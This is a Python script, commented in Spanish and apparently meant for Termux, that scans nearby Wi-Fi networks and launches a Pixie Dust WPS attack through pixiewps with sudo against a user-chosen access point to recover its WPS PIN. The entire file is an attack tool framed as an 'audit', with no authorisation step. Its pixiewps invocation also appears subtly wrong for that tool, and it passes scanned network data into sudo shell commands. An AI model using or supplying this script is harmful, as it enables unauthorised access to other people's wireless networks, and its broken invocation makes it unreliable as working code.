import subprocess
import json
import os
import shutil 

def run_command(command, use_sudo=False):
    """Ejecuta un comando de shell y devuelve la salida."""
    if use_sudo:
        command = f"sudo {command}"
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return stdout.decode(), stderr.decode()

def scan_wifi():
    """Escanea redes Wi-Fi utilizando Termux y devuelve una lista de SSID y BSSID."""
    print("Escaneando redes Wi-Fi...\n")
    stdout, stderr = run_command("termux-wifi-scaninfo", use_sudo=False)

    if stderr:
        print(f"Error al escanear redes Wi-Fi: {stderr}")
        return []

    try:
        networks = json.loads(stdout)
        return [(net['ssid'], net['bssid']) for net in networks if 'ssid' in net and 'bssid' in net]
    except json.JSONDecodeError:
        print("Error al procesar la información del escaneo Wi-Fi.")
        return []

def perform_pixie_dust_attack(bssid):
    """Realiza el ataque Pixie Dust usando pixiewps."""
    print(f"\nIniciando ataque Pixie Dust en BSSID: {bssid}")

    # Ejecutar pixiewps directamente
    pixiewps_command = f"pixiewps -i wlan0 -b {bssid} -vv"
    pixie_stdout, pixie_stderr = run_command(pixiewps_command, use_sudo=True)

    if "WPS pin:" in pixie_stdout:
        pin = extract_value(pixie_stdout, "WPS pin:")
        print(f"\n¡Ataque exitoso! PIN encontrado: {pin}")
        return pin
    else:
        print("\nPixie Dust no pudo encontrar el PIN.")
        return None

def extract_value(output, key):
    """Extrae un valor específico de la salida basada en una clave."""
    for line in output.splitlines():
        if key in line:
            return line.split(key)[-1].strip()
    return None

def check_prerequisites():
    """Verifica que las herramientas necesarias estén instaladas."""
    tools = ["termux-wifi-scaninfo", "pixiewps"]
    for tool in tools:
        if not shutil.which(tool):
            print(f"Error: {tool} no está instalado. Por favor, instálalo e intenta nuevamente.")
            return False
    return True

def main():
    # Verificar herramientas necesarias
    if not check_prerequisites():
        return

    # Escanear redes Wi-Fi
    networks = scan_wifi()
    if not networks:
        print("No se encontraron redes Wi-Fi.\n")
        return

    # Mostrar redes disponibles
    print("\nRedes Wi-Fi detectadas:")
    for i, (ssid, bssid) in enumerate(networks, start=1):
        print(f"{i}. SSID: {ssid} | BSSID: {bssid}")

    # Seleccionar red para auditar
    try:
        choice = int(input("\nSelecciona la red para auditar (número): "))
        selected_ssid, selected_bssid = networks[choice - 1]
        print(f"\nRed seleccionada: {selected_ssid} ({selected_bssid})")
    except (ValueError, IndexError):
        print("Selección inválida. Saliendo...")
        return

    # Intentar auditoría Pixie Dust
    perform_pixie_dust_attack(selected_bssid)

if __name__ == "__main__":
    main()






